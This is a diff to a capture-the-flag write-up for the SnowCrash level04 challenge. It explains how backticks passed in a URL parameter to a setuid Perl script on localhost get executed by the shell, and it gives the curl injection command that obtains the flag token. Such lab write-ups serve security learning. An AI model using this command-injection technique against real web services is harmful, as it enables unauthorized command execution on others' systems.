@@ -1,6 +1,6 @@
-A .pl is present in the home. It is a Perl script. The comment `localhost:4747` is a hint to call the script threw the curl tool.
+A .pl is present in the home. It is a Perl script. The comment `localhost:4747` is a hint to call the script through the curl tool.
 It has "s" in the execution permissions, meaning it will set its uid to flag04 in this case:
-level03@SnowCrash:~$ ls -l
+level04@SnowCrash:~$ ls -l
 total 4
 -rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
 
@@ -8,7 +8,7 @@ total 4
 From the perl function x call, we understood that only the parameter named "x" will be print.
 `curl localhost:4747?x=yeet` print "yeet".
 
-Then, using backtick around the string to print, we can execute any command. Thus, with the following command:
+Then, by passing litteral backticks around the string to print, we can execute any command thanks to the Bash Command Substitution. Thus, with the following command:
 curl localhost:4747?x=\`getflag\`
 
 We can retrieve the token for the next level.
